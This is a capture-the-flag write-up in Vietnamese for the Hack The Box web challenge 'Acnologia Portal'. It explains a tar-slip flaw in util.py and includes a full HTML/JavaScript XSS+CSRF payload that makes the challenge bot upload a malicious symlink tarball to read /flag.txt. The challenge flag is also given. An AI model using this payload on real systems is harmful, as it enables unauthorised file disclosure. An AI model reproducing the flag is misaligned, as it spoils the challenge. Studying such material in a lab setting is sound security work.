# Acnologia Portal

## Unintended solution
Vul trong util.py ở dòng code:
```py
tar.extractall(tmp)
```
Đọc thêm tại [đây](https://codeql.github.com/codeql-query-help/python/py-tarslip/#):

Kịch bản khai thác: tạo môt 
1. Tạo một symlink `flag.txt -> /flag.txt`
2. Dùng [evilarc](https://github.com/ptoomey3/evilarc) để tạo tar `file.tar.gz` từ symlink
3. XSS + CSRF con bot để fetch và upload một `file.tar.gz`.
4. Access `<URL>/static/flag.txt` để lấy flag

script:
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flag</title>
</head>

<body>
    <script>
        function base64toBlob(base64Data, contentType) {
            contentType = contentType || '';
            var sliceSize = 1024;
            var byteCharacters = atob(base64Data);
            var bytesLength = byteCharacters.length;
            var slicesCount = Math.ceil(bytesLength / sliceSize);
            var byteArrays = new Array(slicesCount);

            for (var sliceIndex = 0; sliceIndex < slicesCount; ++sliceIndex) {
                var begin = sliceIndex * sliceSize;
                var end = Math.min(begin + sliceSize, bytesLength);

                var bytes = new Array(end - begin);
                for (var offset = begin, i = 0; offset < end; ++i, ++offset) {
                    bytes[i] = byteCharacters[offset].charCodeAt(0);
                }
                byteArrays[sliceIndex] = new Uint8Array(bytes);
            }
            return new Blob(byteArrays, {
                type: contentType
            });
        }

        var b64file = "H4sICHIWg2IC/2V2aWwudGFyAO3PXQrCMBBG0SwlK8hfk2Y9oWgplFg0Bd29qbQvRSkKvt3DhA9mAskopdW70mmaljMOXSrDJetbqdnp85h6Ve5FfMFUMcYlbQxmzebVXwnrnTetdb6tcxesCUK63Z9+efvQXBe7SilyPz9O+fO9o/m2yJYAAAAAAAAAAAAAAAAAAPzRE79WLagAKAAA";

        var content_type = 'application/x-gtar-compressed';
        var blob = base64toBlob(b64file, content_type);

        var formData = new FormData();
        formData.append('file', blob, 'file.tar.gz');

        var url = '/api/firmware/upload';
        var request = new XMLHttpRequest();
        request.open('POST', url);
        request.send(formData);
    </script>
</body>

</html>

<!-- https://www.dubget.com/file-upload-via-xss.html -->
<!-- https://codeql.github.com/codeql-query-help/python/py-tarslip/# -->
```

## Intended solution
<https://gist.github.com/pich4ya/fa26c091c989db14234b2f9aa81fedbc>

**HTB{des3r1aliz3_4ll_th3_th1ngs}**
